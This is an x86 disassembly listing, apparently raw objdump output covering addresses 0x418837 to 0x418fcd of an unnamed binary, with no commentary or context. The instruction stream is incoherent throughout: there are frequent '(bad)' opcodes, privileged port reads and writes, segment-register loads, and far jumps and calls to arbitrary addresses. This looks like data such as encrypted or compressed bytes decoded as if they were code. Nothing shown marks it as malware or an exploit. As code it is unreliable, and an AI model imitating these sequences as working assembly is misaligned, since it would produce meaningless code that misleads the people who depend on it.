  418837:	fcmove st,st(3)
  418839:	test   eax,0x46391af2
  41883e:	mov    cl,0x50
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	cli    
  418849:	xchg   esp,eax
  41884a:	sbb    DWORD PTR es:[ebp+edi*1+0x1d9c6083],edx
  418852:	xchg   esi,eax
  418853:	mov    BYTE PTR [edi-0x4f],ah
  418856:	clc    
  418857:	in     al,0xea
  418859:	das    
  41885a:	in     al,0xd6
  41885c:	sub    al,0x6a
  41885e:	mov    esp,0xda8d284a
  418863:	mov    al,ds:0x272d1e35
  418868:	jbe    0x4188e8
  41886a:	lds    eax,FWORD PTR [ecx-0x39]
  41886d:	and    al,0x67
  41886f:	xchg   DWORD PTR [ecx+0x35],ecx
  418872:	cmp    BYTE PTR ds:0xcb55e0fe,ch
  418878:	mov    edi,DWORD PTR [ebp-0xc]
  41887b:	or     cl,BYTE PTR [edi]
  41887d:	dec    ecx
  41887e:	mov    dl,0x3
  418880:	jge    0x41883f
  418882:	fisubr DWORD PTR [edx+edx*4]
  418885:	cmp    eax,0xda7189b3
  41888a:	or     BYTE PTR [ebp+0x4e7ea314],dh
  418890:	mov    al,ds:0x5dff5573
  418895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418896:	inc    ebx
  418897:	sbb    BYTE PTR [edx+0x569f3d7d],ah
  41889d:	add    ch,0x4f
  4188a0:	fdivp  st(4),st
  4188a2:	push   eax
  4188a3:	push   edx
  4188a4:	mov    ecx,0xe742541b
  4188a9:	push   es
  4188aa:	test   DWORD PTR [ebp-0x68],0xa5c66863
  4188b1:	inc    esi
  4188b2:	jmp    0x4188c4
  4188b4:	loop   0x41883e
  4188b6:	dec    eax
  4188b7:	jmp    edi
  4188b9:	in     ax,dx
  4188bb:	out    0x1a,eax
  4188bd:	mov    es,WORD PTR [edi+0x7ea95861]
  4188c3:	ror    ebx,1
  4188c5:	pop    ebp
  4188c6:	leave  
  4188c7:	dec    edi
  4188c8:	mov    ecx,0x920d7cec
  4188cd:	pop    eax
  4188ce:	jle    0x4188d5
  4188d0:	stos   BYTE PTR es:[edi],al
  4188d1:	inc    edx
  4188d2:	into   
  4188d3:	and    al,0x1e
  4188d5:	jecxz  0x418953
  4188d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d8:	ret    0xf4b
  4188db:	adc    al,0x7c
  4188dd:	pop    ebp
  4188de:	jl     0x41892f
  4188e0:	jo     0x418896
  4188e2:	rcr    BYTE PTR [esi],cl
  4188e4:	pusha  
  4188e5:	in     eax,dx
  4188e6:	fimul  DWORD PTR [edi+0x14]
  4188e9:	(bad)  
  4188eb:	enter  0xcb73,0x81
  4188ef:	imul   ebp,DWORD PTR [esp+ebp*2],0x27
  4188f3:	inc    edx
  4188f4:	inc    ecx
  4188f5:	fcmovu st,st(1)
  4188f7:	mov    gs,WORD PTR [eax]
  4188f9:	sub    bh,BYTE PTR [esi]
  4188fb:	ds not ebx
  4188fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188ff:	sti    
  418900:	add    eax,DWORD PTR [ebx]
  418902:	mov    eax,ds:0x47e7cb2b
  418907:	push   ebx
  418908:	test   eax,0xb78a2e7c
  41890d:	mov    esi,0xa186bd65
  418912:	xor    DWORD PTR [ecx+0x75],edx
  418915:	out    0x73,al
  418917:	sar    eax,cl
  418919:	fild   DWORD PTR [ecx+0x4aa124e4]
  41891f:	sbb    eax,0xf87531a3
  418924:	inc    esi
  418925:	or     al,0xe4
  418927:	leave  
  418928:	jg     0x4188e0
  41892a:	ret    0x5e6d
  41892d:	push   edi
  41892e:	add    eax,esi
  418930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418931:	dec    ecx
  418932:	clc    
  418933:	mov    eax,0xb75d439a
  418938:	cmp    al,0xff
  41893a:	aad    0xe6
  41893c:	mov    ebx,0xe2d7188d
  418941:	cs dec esi
  418943:	push   esi
  418944:	shl    BYTE PTR [eax+ebx*2-0x7adb8724],0x8a
  41894c:	jns    0x418932
  41894e:	mov    ecx,0x6bf3e476
  418953:	sub    BYTE PTR [ebp+0xebe4b6e],dl
  418959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41895a:	xor    BYTE PTR ds:0xb65f8b9,0x13
  418961:	clc    
  418962:	dec    edi
  418963:	pop    ebp
  418964:	add    esp,esp
  418966:	in     al,dx
  418967:	push   edi
  418968:	dec    edx
  418969:	hlt    
  41896a:	daa    
  41896b:	test   al,0x1c
  41896d:	call   edx
  41896f:	pusha  
  418970:	mov    cl,0xd2
  418972:	lock xchg BYTE PTR [ecx+edx*2-0x4b],ah
  418977:	push   ss
  418978:	mov    edx,0x2a15684e
  41897d:	sbb    dl,BYTE PTR [edx+0x6]
  418980:	pushf  
  418981:	xor    al,0x99
  418983:	mov    esp,0xb2d04cdb
  418988:	rcr    BYTE PTR [edx],1
  41898a:	rcl    BYTE PTR [eax],0x7a
  41898d:	adc    dl,BYTE PTR [edx+0x33]
  418990:	and    ebp,0xf90f874c
  418996:	mov    edi,0x7cd8d575
  41899b:	jnp    0x4189aa
  41899d:	jbe    0x4189f8
  41899f:	jp     0x41897d
  4189a1:	push   ecx
  4189a2:	fdiv   QWORD PTR [ebx+0x42]
  4189a5:	popa   
  4189a6:	jbe    0x41898c
  4189a8:	popa   
  4189a9:	lock sbb al,0xf4
  4189ac:	inc    ebp
  4189ad:	adc    edx,DWORD PTR [ebp+0x45]
  4189b0:	nop
  4189b1:	stc    
  4189b2:	mov    bl,0x23
  4189b4:	mov    fs,WORD PTR [ebx-0x5dc373d6]
  4189ba:	push   0xc3d015ac
  4189bf:	popa   
  4189c0:	xor    DWORD PTR [edi-0x3f],edi
  4189c3:	mov    bh,0x85
  4189c5:	adc    BYTE PTR [esi+0x662be21a],ah
  4189cb:	jp     0x418969
  4189cd:	das    
  4189ce:	leave  
  4189cf:	jl     0x4189be
  4189d1:	(bad)
  4189d5:	dec    edi
  4189d6:	jb     0x4189a6
  4189d8:	cmp    DWORD PTR [esi-0x7b47dbd7],ecx
  4189de:	jbe    0x418979
  4189e0:	loopne 0x418a26
  4189e2:	ds cs push ss
  4189e5:	(bad)  
  4189e7:	sub    bl,BYTE PTR [edi+ecx*2-0x59]
  4189eb:	mov    dh,0x39
  4189ed:	dec    esi
  4189ee:	xor    ebp,DWORD PTR [ecx-0x6e]
  4189f1:	xchg   ecx,eax
  4189f2:	inc    esi
  4189f3:	retf   0x4571
  4189f6:	mov    dh,BYTE PTR ds:0x34c65c16
  4189fc:	push   cs
  4189fd:	dec    esp
  4189fe:	dec    eax
  4189ff:	loope  0x418a7e
  418a01:	and    al,BYTE PTR [eax-0x7e]
  418a04:	xchg   edi,eax
  418a05:	iret   
  418a06:	adc    DWORD PTR [esi-0x3e5ccddf],esp
  418a0c:	leave  
  418a0d:	cld    
  418a0e:	cs rcr esp,cl
  418a11:	sbb    al,0xd9
  418a13:	inc    ebx
  418a14:	push   es
  418a15:	push   ebp
  418a16:	popa   
  418a17:	pushf  
  418a18:	clc    
  418a19:	dec    ecx
  418a1a:	add    bh,bh
  418a1c:	mov    ds:0x7c2a0fac,eax
  418a21:	ss inc esi
  418a23:	cmp    ah,BYTE PTR [ebx+0x2b34f017]
  418a29:	sbb    DWORD PTR [eax+0xb],edx
  418a2c:	add    BYTE PTR [ecx-0x1a931d8],ah
  418a32:	xchg   ebx,eax
  418a33:	dec    edx
  418a34:	jno    0x418a95
  418a36:	iret   
  418a37:	cli    
  418a38:	jno    0x418a39
  418a3a:	pop    eax
  418a3b:	leave  
  418a3c:	lds    esp,FWORD PTR [ecx-0x80]
  418a3f:	jg     0x418a5f
  418a41:	fstp   st(3)
  418a43:	shl    DWORD PTR [eax-0x67],cl
  418a46:	ins    BYTE PTR es:[edi],dx
  418a47:	pop    ss
  418a48:	cmp    eax,0x6d40b3f0
  418a4d:	dec    esi
  418a4e:	xchg   DWORD PTR cs:[esi],edx
  418a51:	xor    dl,BYTE PTR [ecx-0x3c9ae25b]
  418a57:	repnz mov dl,BYTE PTR [edx]
  418a5a:	xor    DWORD PTR [esi-0x34],esp
  418a5d:	xchg   BYTE PTR [ebp-0x1a],cl
  418a60:	(bad)  
  418a61:	in     al,0xa6
  418a63:	movsx  ecx,BYTE PTR [ebx]
  418a66:	dec    eax
  418a67:	dec    esp
  418a68:	push   esi
  418a69:	and    al,0x51
  418a6b:	sbb    esi,ecx
  418a6d:	xor    cl,BYTE PTR [edx-0x476d013e]
  418a73:	inc    esp
  418a74:	jmp    0xf0d79d84
  418a79:	aas    
  418a7a:	inc    edi
  418a7b:	cmp    eax,0x45735011
  418a80:	pop    edi
  418a81:	jle    0x418a22
  418a83:	and    BYTE PTR [esi],bl
  418a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a86:	xchg   DWORD PTR ds:[ebp-0x3],esp
  418a8a:	test   esi,ebx
  418a8c:	pushf  
  418a8d:	popf   
  418a8e:	dec    ecx
  418a8f:	sbb    DWORD PTR [edx+0x22],ecx
  418a92:	out    0x6c,eax
  418a94:	(bad)  
  418a95:	xchg   edx,eax
  418a96:	loop   0x418a1b
  418a98:	push   ecx
  418a99:	test   eax,0xfe3f230
  418a9e:	lds    esp,FWORD PTR [ebp-0x5f8a6550]
  418aa4:	push   esp
  418aa5:	stc    
  418aa6:	(bad)  
  418aa7:	je     0x418aa8
  418aa9:	lea    ebx,ds:0x6131ae1f
  418aaf:	dec    esi
  418ab0:	sub    edx,ebp
  418ab2:	lods   eax,DWORD PTR ds:[esi]
  418ab3:	add    eax,0x99ea0af9
  418ab8:	pop    ss
  418ab9:	sub    al,0x35
  418abb:	jecxz  0x418a56
  418abd:	mov    dh,0xf6
  418abf:	inc    edi
  418ac0:	pop    edx
  418ac1:	adc    BYTE PTR [esp+eax*4-0x7],bl
  418ac5:	fisubr WORD PTR [edi-0x4e]
  418ac8:	and    al,0x2d
  418aca:	loopne 0x418b19
  418acc:	inc    ecx
  418acd:	xchg   edi,eax
  418ace:	(bad)  
  418acf:	or     ah,BYTE PTR [edx+0x5548c52c]
  418ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ad6:	sti    
  418ad7:	stos   BYTE PTR es:[edi],al
  418ad8:	pop    ebp
  418ad9:	add    ebx,ebx
  418adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418adc:	cmp    DWORD PTR [ecx+eax*8-0x6e3defc8],edi
  418ae3:	dec    esp
  418ae4:	call   0x2bb6c01a
  418ae9:	xlat   BYTE PTR ds:[ebx]
  418aea:	mov    al,0x5b
  418aec:	(bad)  
  418aed:	out    0xd9,al
  418aef:	push   eax
  418af0:	pop    ss
  418af1:	lahf   
  418af2:	jne    0x418b48
  418af4:	push   cs
  418af5:	aad    0x72
  418af7:	repz sbb DWORD PTR [edx+0x2],ecx
  418afb:	push   DWORD PTR [edx+0x31]
  418afe:	lds    esp,FWORD PTR [esi-0x6a726aea]
  418b04:	cmp    cl,BYTE PTR [ebx+0x34]
  418b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b08:	mov    ebx,0xd8eaf41e
  418b0d:	or     BYTE PTR [edx],al
  418b0f:	add    edi,ebp
  418b11:	xchg   DWORD PTR [ebp-0x5d],eax
  418b14:	push   ds
  418b15:	xlat   BYTE PTR ds:[ebx]
  418b16:	mov    dh,0x15
  418b18:	icebp  
  418b19:	and    DWORD PTR [ebx+0x73],esp
  418b1c:	(bad)  
  418b1d:	das    
  418b1e:	lock xchg edx,eax
  418b20:	adc    eax,0x418b2f9d
  418b25:	lahf   
  418b26:	mov    bh,0x27
  418b28:	stc    
  418b29:	xor    al,0x6f
  418b2b:	out    0x30,eax
  418b2d:	lods   al,BYTE PTR ds:[esi]
  418b2e:	out    dx,eax
  418b2f:	pushf  
  418b30:	stos   DWORD PTR es:[edi],eax
  418b31:	or     edi,DWORD PTR [eax+0x76]
  418b34:	pop    edx
  418b35:	into   
  418b36:	mov    al,0xd8
  418b38:	cli    
  418b39:	inc    esi
  418b3a:	xor    ebx,edi
  418b3c:	cmc    
  418b3d:	popa   
  418b3e:	aad    0xed
  418b40:	cmp    al,0x7e
  418b42:	or     dh,bl
  418b44:	add    edi,edi
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	pushf  
  418b63:	call   0x787f:0xc312ff60
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	push   esi
  418b6f:	dec    ebx
  418b70:	aad    0xe1
  418b72:	gs aaa 
  418b74:	adc    DWORD PTR [ecx],0xdeb40f9c
  418b7a:	mov    cl,0x32
  418b7c:	test   BYTE PTR [ebp+0x7f],0x11
  418b80:	jecxz  0x418b32
  418b82:	pop    edx
  418b83:	test   eax,0x711be7ed
  418b88:	das    
  418b89:	jge    0x418be0
  418b8b:	dec    esi
  418b8c:	rcr    DWORD PTR [ebx-0x47],cl
  418b8f:	sbb    DWORD PTR [ebx+ebp*2-0x39],0x2536c178
  418b97:	cmp    BYTE PTR [ebp+0x19],ch
  418b9a:	adc    DWORD PTR cs:0x80feca06,edx
  418ba1:	push   ss
  418ba2:	mov    eax,0x8de0144a
  418ba7:	popa   
  418ba8:	ss lahf 
  418baa:	jb     0x418bc0
  418bac:	mov    eax,0x2bbeb0ae
  418bb1:	xor    DWORD PTR [ecx],0xc1670849
  418bb7:	push   0x4a
  418bb9:	dec    esp
  418bba:	arpl   WORD PTR [edx+0x730ed2dd],bx
  418bc0:	shr    DWORD PTR [edx],1
  418bc2:	ret    0x9409
  418bc5:	lods   eax,DWORD PTR ds:[esi]
  418bc6:	gs push eax
  418bc8:	sbb    BYTE PTR gs:[eax+eax*1],dl
  418bcc:	into   
  418bcd:	into   
  418bce:	adc    BYTE PTR [ecx],al
  418bd0:	and    edx,DWORD PTR [edi+0x64e0e74f]
  418bd6:	rcr    DWORD PTR [edx+0x3477b97e],cl
  418bdc:	pop    esp
  418bdd:	jl     0x418bbf
  418bdf:	fwait
  418be0:	nop
  418be1:	mov    dl,BYTE PTR ds:0x31f8fae7
  418be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418be8:	cmc    
  418be9:	mov    WORD PTR [ebx+esi*4],es
  418bec:	mov    esi,0x5278b395
  418bf1:	ins    BYTE PTR es:[edi],dx
  418bf2:	call   0x2885c9ed
  418bf7:	mov    al,0x4e
  418bf9:	xchg   DWORD PTR [ecx],eax
  418bfb:	add    eax,0xceefc43e
  418c00:	bound  ebx,QWORD PTR [eax]
  418c02:	sub    DWORD PTR [ebx+0x46],edx
  418c05:	push   ecx
  418c06:	cli    
  418c07:	loopne 0x418c49
  418c09:	mov    ah,0x7b
  418c0b:	rcl    BYTE PTR [ebp+0x31c9dd17],cl
  418c11:	push   0xd388b264
  418c16:	jne    0x418be0
  418c18:	xor    DWORD PTR [eax-0x6d43e032],edx
  418c1e:	add    al,0x3f
  418c20:	mov    dh,0x77
  418c22:	mov    cl,0x96
  418c24:	dec    eax
  418c25:	bound  ebx,QWORD PTR [ebx-0x2c]
  418c28:	clc    
  418c29:	xlat   BYTE PTR ds:[ebx]
  418c2a:	sub    esi,DWORD PTR [eax]
  418c2c:	aas    
  418c2d:	dec    edi
  418c2e:	psubsw mm0,mm6
  418c31:	xchg   ebp,eax
  418c32:	addr16 in eax,0x79
  418c35:	pop    eax
  418c36:	xchg   esi,eax
  418c37:	push   0x78
  418c39:	scas   eax,DWORD PTR es:[edi]
  418c3a:	loop   0x418c9e
  418c3c:	rcr    BYTE PTR [ebx],cl
  418c3e:	rcr    ch,0x7b
  418c41:	pop    ebp
  418c42:	adc    DWORD PTR [ebx+0x6d],ebp
  418c45:	add    BYTE PTR [edi+0x1f7a9b9e],bl
  418c4b:	imul   ecx,DWORD PTR [edi-0x31f60168],0x9b6616c2
  418c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c56:	out    0x0,al
  418c58:	push   ecx
  418c59:	fimul  WORD PTR [ebp+eiz*2-0x38d639e9]
  418c60:	mov    ch,0x2f
  418c62:	loopne 0x418c58
  418c64:	jle    0x418bf2
  418c66:	cmp    DWORD PTR [eax+eax*2],0xffffff96
  418c6a:	sahf   
  418c6b:	pushf  
  418c6c:	dec    edi
  418c6d:	adc    esp,DWORD PTR [ebx+edi*1-0x108b6561]
  418c74:	ds jg  0x418ce6
  418c77:	sub    eax,0x1e3095b6
  418c7c:	or     al,BYTE PTR [ecx-0x67]
  418c7f:	push   esp
  418c80:	adc    eax,0x66f2f12d
  418c85:	cli    
  418c86:	inc    edx
  418c87:	cmp    ebx,DWORD PTR [esi+0x48]
  418c8a:	mov    al,0x33
  418c8c:	stos   BYTE PTR es:[edi],al
  418c8d:	dec    ebp
  418c8e:	ror    DWORD PTR [eax+0x24923243],1
  418c94:	mov    ch,0x8d
  418c96:	cs cwde 
  418c98:	adc    al,0xf
  418c9a:	iret   
  418c9b:	xchg   ecx,eax
  418c9c:	and    DWORD PTR [ebx],eax
  418c9e:	push   esi
  418c9f:	mov    eax,ds:0x42609ce6
  418ca4:	or     DWORD PTR [eax],0x8a920471
  418caa:	cwde   
  418cab:	addr16 inc ecx
  418cad:	mov    eax,ds:0x7b68605a
  418cb2:	jbe    0x418c3d
  418cb4:	es mov eax,0xc4adffa0
  418cba:	jg     0x418ce8
  418cbc:	dec    eax
  418cbd:	sub    al,0x32
  418cbf:	xchg   esi,eax
  418cc0:	cmp    esi,DWORD PTR [edx]
  418cc2:	jmp    0x392e:0x1f2b53c2
  418cc9:	repz sbb al,0x3e
  418ccc:	(bad)  
  418ccd:	xor    ebp,edi
  418ccf:	mov    bl,0x49
  418cd1:	addr16 inc eax
  418cd3:	data16 and ah,al
  418cd6:	cmp    DWORD PTR [ebx+eax*8-0x5a12883f],ecx
  418cdd:	and    bl,BYTE PTR [ebx+0x5cec24fd]
  418ce3:	cmp    al,0xb6
  418ce5:	dec    edi
  418ce6:	jae    0x418ce0
  418ce8:	cli    
  418ce9:	sub    al,0xca
  418ceb:	pop    eax
  418cec:	xchg   BYTE PTR [edx],cl
  418cee:	mov    ebp,0xded8c31f
  418cf3:	mov    al,ds:0x309c8999
  418cf8:	cmp    edx,DWORD PTR ds:[ebp-0x7adde899]
  418cff:	pushf  
  418d00:	sub    edx,ebx
  418d02:	mov    esp,0x56c4359a
  418d07:	add    ecx,edx
  418d09:	mov    ds:0x44ef5db8,al
  418d0e:	inc    ecx
  418d0f:	and    DWORD PTR [esi-0x20],esp
  418d12:	jecxz  0x418d8b
  418d14:	xor    ebp,esi
  418d16:	loope  0x418d53
  418d18:	add    dh,BYTE PTR [ebp+0x1693d38e]
  418d1e:	inc    edi
  418d1f:	pop    ss
  418d20:	mov    ah,0x6e
  418d22:	jns    0x418d71
  418d24:	jmp    0xb1bf:0x9fdcf789
  418d2b:	mov    esp,DWORD PTR [ebp-0x7d2d5eb0]
  418d31:	push   eax
  418d32:	popf   
  418d33:	repz lahf 
  418d35:	dec    edi
  418d36:	cld    
  418d37:	cli    
  418d38:	sub    BYTE PTR [esi+0x51bcb894],ch
  418d3e:	xchg   ecx,eax
  418d3f:	leave  
  418d40:	jle    0x418ce9
  418d42:	sti    
  418d43:	in     eax,0xe7
  418d45:	js     0x418ced
  418d47:	pop    ebp
  418d48:	sub    eax,0x3fe1ac8d
  418d4d:	fwait
  418d4e:	(bad)
  418d51:	je     0x418da1
  418d53:	sbb    eax,0x31070e69
  418d58:	das    
  418d59:	mov    ah,0x6c
  418d5b:	jmp    0x110d:0x641e1d75
  418d62:	adc    al,0x81
  418d64:	shl    BYTE PTR [edx+edi*8+0x76],1
  418d68:	dec    ecx
  418d69:	or     edi,DWORD PTR ds:0x67c4b938
  418d6f:	push   0x21
  418d71:	mov    bh,0xc1
  418d73:	loop   0x418de9
  418d75:	dec    ebp
  418d76:	call   FWORD PTR [ecx+0x9]
  418d79:	jnp    0x418d39
  418d7b:	adc    DWORD PTR [ebp+0x29],eax
  418d7e:	cld    
  418d7f:	scas   eax,DWORD PTR es:[edi]
  418d80:	xchg   ebx,eax
  418d81:	sub    eax,edi
  418d83:	mov    eax,ds:0xa6db5591
  418d88:	sahf   
  418d89:	loop   0x418d35
  418d8b:	clc    
  418d8c:	cmp    DWORD PTR [eax],esi
  418d8e:	fdivr  st,st(6)
  418d90:	out    dx,al
  418d91:	mov    ebx,0xb27018fe
  418d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d97:	jbe    0x418d71
  418d99:	xlat   BYTE PTR ds:[ebx]
  418d9a:	pusha  
  418d9b:	inc    ebp
  418d9c:	mov    ch,0xc4
  418d9e:	outs   dx,BYTE PTR ds:[esi]
  418d9f:	loope  0x418df4
  418da1:	in     eax,dx
  418da2:	dec    ebp
  418da3:	inc    ebp
  418da4:	fisubr DWORD PTR [edx+ecx*8]
  418da7:	jae    0x418e02
  418da9:	ds push esp
  418dab:	repnz ins DWORD PTR es:[edi],dx
  418dad:	dec    edx
  418dae:	adc    BYTE PTR [eax],dh
  418db0:	or     eax,DWORD PTR [edx+0x7d471953]
  418db6:	test   al,0x8c
  418db8:	shl    DWORD PTR [esi+0x2c7006e5],cl
  418dbe:	stos   BYTE PTR es:[edi],al
  418dbf:	jg     0x418dbb
  418dc1:	adc    bh,0x1c
  418dc4:	inc    edi
  418dc5:	and    bh,dl
  418dc7:	fldcw  WORD PTR [eax-0x2c]
  418dca:	jl     0x418dde
  418dcc:	adc    cl,BYTE PTR [ecx-0x39]
  418dcf:	jno    0x418d8a
  418dd1:	inc    edx
  418dd2:	dec    esp
  418dd3:	je     0x418d76
  418dd5:	pop    edi
  418dd6:	dec    esp
  418dd7:	dec    eax
  418dd8:	xchg   ebx,eax
  418dd9:	mov    ecx,0xed03c36f
  418dde:	pop    ss
  418ddf:	lds    ecx,FWORD PTR [esi+0x19]
  418de2:	xor    eax,0x29dba2f0
  418de7:	mov    cl,0xa9
  418de9:	dec    esi
  418dea:	dec    ebp
  418deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dec:	call   0xb85aca77
  418df1:	ds mov eax,0xee3d64fb
  418df7:	xchg   edx,eax
  418df8:	and    BYTE PTR [eax+0x512da5b0],al
  418dfe:	std    
  418dff:	mov    bh,0xf1
  418e01:	or     dh,bl
  418e03:	jnp    0x418e48
  418e05:	add    esi,DWORD PTR ds:0xdf4e119e
  418e0b:	(bad)
  418e0e:	jae    0x418da0
  418e10:	dec    eax
  418e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e12:	daa    
  418e13:	ret    0xa450
  418e16:	pop    ss
  418e17:	nop
  418e18:	xor    BYTE PTR [ecx-0x2cbf757],ah
  418e1e:	loop   0x418e1a
  418e20:	dec    ebp
  418e21:	aad    0x55
  418e23:	add    BYTE PTR [eax],ah
  418e25:	data16 rol BYTE PTR [esi+0x42],1
  418e29:	or     dh,BYTE PTR [eax+0x74]
  418e2c:	loopne 0x418e54
  418e2e:	xor    BYTE PTR [ebp+edx*1+0x4334de91],al
  418e35:	dec    edx
  418e36:	mov    edx,0x8e199c6
  418e3b:	mov    ah,0x79
  418e3d:	dec    ebx
  418e3e:	mov    ds:0x30f77532,al
  418e43:	loop   0x418e3d
  418e45:	je     0x418e1c
  418e47:	or     DWORD PTR [ebx-0x77ef60cf],ebx
  418e4d:	fnstsw WORD PTR [eax+0x398d93af]
  418e53:	rcl    DWORD PTR [ecx+0x1c9d95da],0x65
  418e5a:	fimul  DWORD PTR [ebp-0x5c]
  418e5d:	js     0x418e3b
  418e5f:	ins    BYTE PTR es:[edi],dx
  418e60:	(bad)  
  418e61:	loopne 0x418ec9
  418e63:	popf   
  418e64:	dec    esi
  418e65:	shl    BYTE PTR [esi],0xcd
  418e68:	shl    BYTE PTR [edx-0x74cf0037],1
  418e6e:	inc    ebp
  418e6f:	adc    cl,ch
  418e71:	adc    eax,0xcb000003
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	ins    DWORD PTR es:[edi],dx
  418e82:	xchg   ecx,eax
  418e83:	mov    bh,BYTE PTR ds:0x787fc00d
  418e89:	jnp    0x418f09
  418e8b:	js     0x418f05
  418e8d:	call   FWORD PTR [edx+0x4cc720e7]
  418e93:	dec    di
  418e95:	xchg   esp,eax
  418e96:	inc    esi
  418e97:	(bad)  
  418e98:	ds std 
  418e9a:	mov    al,0xf5
  418e9c:	cwde   
  418e9d:	push   esp
  418e9e:	jmp    0xc01a:0xafbe354a
  418ea5:	js     0x418e88
  418ea7:	jl     0x418f10
  418ea9:	xchg   edi,eax
  418eaa:	mov    ebx,0xab6a2242
  418eaf:	repz adc BYTE PTR [edi+0x4b],dh
  418eb3:	pusha  
  418eb4:	add    DWORD PTR [esp+ecx*1],eax
  418eb7:	push   0x29
  418eb9:	inc    ebp
  418eba:	fsub   QWORD PTR [ecx]
  418ebc:	in     eax,0x2c
  418ebe:	cwde   
  418ebf:	jne    0x418e82
  418ec1:	mov    bh,0xc6
  418ec3:	hlt    
  418ec4:	and    esi,eax
  418ec6:	dec    eax
  418ec7:	stc    
  418ec8:	or     esi,ebx
  418eca:	push   ebx
  418ecb:	das    
  418ecc:	mov    dh,0x15
  418ece:	stc    
  418ecf:	in     eax,dx
  418ed0:	and    al,0x1c
  418ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ed3:	add    al,0x33
  418ed5:	jae    0x418e57
  418ed7:	or     eax,0x83bd0786
  418edc:	call   0x13d7:0x3dc28b0
  418ee3:	jecxz  0x418ec5
  418ee5:	or     bh,BYTE PTR [eax-0x5f6468ed]
  418eeb:	nop
  418eec:	cld    
  418eed:	xchg   DWORD PTR [ebp-0x12],ecx
  418ef0:	sub    al,BYTE PTR [eax-0x5e6f341]
  418ef6:	repnz fnstenv [ecx+0x78e5a526]
  418efd:	mov    DWORD PTR [eax+0x11],edi
  418f00:	push   ebp
  418f01:	stc    
  418f02:	push   edi
  418f03:	push   cs
  418f04:	pop    eax
  418f05:	(bad)  
  418f06:	in     eax,dx
  418f07:	mov    edx,0xfd547e1
  418f0c:	pop    ecx
  418f0d:	fild   QWORD PTR [edx-0x5f]
  418f10:	mov    edx,0x5347188f
  418f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f16:	mov    eax,0xc0179449
  418f1b:	pop    eax
  418f1c:	push   edx
  418f1d:	daa    
  418f1e:	sub    DWORD PTR [ebp+0x25],edi
  418f21:	vunpcklpd ymm1,ymm7,YMMWORD PTR [ebx+eax*2+0x526c5c11]
  418f2a:	(bad)  
  418f2b:	push   ebp
  418f2c:	sbb    al,cl
  418f2e:	jo     0x418ed2
  418f30:	fwait
  418f31:	not    BYTE PTR [ebp+0x1e7faef2]
  418f37:	dec    ebp
  418f38:	jno    0x418fa8
  418f3a:	test   DWORD PTR [edi+0x73070f16],0xc91437d8
  418f44:	jmp    0x418f60
  418f46:	dec    ecx
  418f47:	scas   eax,DWORD PTR es:[edi]
  418f48:	jbe    0x418f1e
  418f4a:	mov    ecx,0xa1f4aba
  418f4f:	push   edi
  418f50:	sub    al,0x14
  418f52:	ins    BYTE PTR es:[di],dx
  418f54:	les    esp,FWORD PTR [ebx+0x3c1b3946]
  418f5a:	into   
  418f5b:	jl     0x418f7f
  418f5d:	mov    al,ds:0xd5add591
  418f62:	xlat   BYTE PTR ds:[ebx]
  418f63:	fs xchg edi,eax
  418f65:	pusha  
  418f66:	or     DWORD PTR [ebx+0x33b6fe90],ebx
  418f6c:	mov    ch,0xdb
  418f6e:	(bad)  
  418f70:	and    al,0xd8
  418f72:	adc    al,0xaf
  418f74:	in     al,dx
  418f75:	jns    0x418fb9
  418f77:	xor    BYTE PTR [ebp-0x3d1298f7],ch
  418f7d:	(bad)  
  418f7e:	mov    ebx,esi
  418f80:	dec    eax
  418f81:	or     al,0xe5
  418f83:	addr16 (bad) 
  418f85:	sbb    al,0xf0
  418f87:	mov    al,dl
  418f89:	push   eax
  418f8a:	daa    
  418f8b:	lods   eax,DWORD PTR ds:[esi]
  418f8c:	add    DWORD PTR [edi-0x74cc1a75],edi
  418f92:	neg    BYTE PTR [eax+edi*2+0x5e]
  418f96:	jb     0x41900e
  418f98:	mov    ecx,0x4fdcde34
  418f9d:	arpl   di,dx
  418f9f:	xor    eax,0x9c78f42c
  418fa4:	sbb    esi,DWORD PTR [eax-0x168b2bc1]
  418faa:	inc    esp
  418fab:	sbb    bh,BYTE PTR [edx]
  418fad:	xchg   esp,eax
  418fae:	lods   al,BYTE PTR ds:[esi]
  418faf:	mov    al,0x35
  418fb1:	mov    esi,ebx
  418fb3:	icebp  
  418fb4:	aam    0xbc
  418fb6:	cmp    ebp,0x4
  418fb9:	jle    0x418f40
  418fbb:	(bad)  
  418fbc:	(bad)  
  418fbd:	sub    ecx,ebp
  418fbf:	jb     0x418fc0
  418fc1:	ret    
  418fc2:	xor    esi,DWORD PTR [ebx-0x9]
  418fc5:	and    DWORD PTR [edi+0x72],ecx
  418fc8:	and    al,0xf8
  418fca:	stos   DWORD PTR es:[edi],eax
  418fcb:	dec    ebp
  418fcc:	ret    
  418fcd:	repnz imul eax,DWORD PTR ds:0xc138c2e6,0x27
